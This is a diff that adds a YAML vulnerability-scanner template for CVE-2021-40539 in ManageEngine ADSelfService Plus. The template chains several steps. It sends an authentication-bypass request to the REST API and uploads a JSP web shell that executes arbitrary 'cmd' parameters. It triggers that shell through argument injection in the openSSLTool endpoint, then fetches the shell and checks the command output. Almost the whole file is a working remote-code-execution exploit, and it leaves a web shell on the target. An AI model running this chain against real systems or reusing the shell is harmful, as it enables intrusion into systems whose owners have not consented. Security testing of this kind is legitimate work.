@@ -1,0 +1,74 @@
+id: cve-2021-40539
+info:
+  name: ManageEngine ADSelfService Plus RCE (CVE-2021-40539)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    ManageEngine ADSelfService Plus is prone to a remote code execution vulnerability via REST API authentication bypass in version 6113 and earlier.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-40539
+    - https://www.manageengine.com/products/self-service-password
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: check-vulnerability
+    method: POST
+    path:
+      - "/./RestAPI/LogonCustomization"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      methodToCall=previewMobLogo
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<script type=\"text/javascript\">var d = new Date();"
+
+  - id: upload-payload
+    method: POST
+    path:
+      - "/./RestAPI/LogonCustomization"
+    headers:
+      Content-Type: multipart/form-data; boundary=883c229f40dc864b2451aaeb4a4aa789
+    body: |
+      --883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name="methodToCall"\r\n\r\nunspecified\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name="Save"\r\n\r\nyes\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name="form"\r\n\r\nsmartcard\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name="operation"\r\n\r\nAdd\r\n--883c229f40dc864b2451aaeb4a4aa789\r\nContent-Disposition: form-data; name="CERTIFICATE_PATH"; filename="ws.jsp"\r\n\r\n<%@ page import="java.util.*,java.io.*"%>\r\n<%\r\nif (request.getParameter("cmd") != null) {\r\n        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while (disr != null) {\r\n                out.println(disr); \r\n                disr = dis.readLine(); \r\n                }\r\n        }\r\n%>\r\n                    \r\n--883c229f40dc864b2451aaeb4a4aa789--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: trigger-payload
+    method: POST
+    path:
+      - "/./RestAPI/Connection"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      methodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+"..\\bin"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: execute-command
+    method: GET
+    path:
+      - "/help/admin-guide/ws.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?i)(administrator|root|\\\\)"
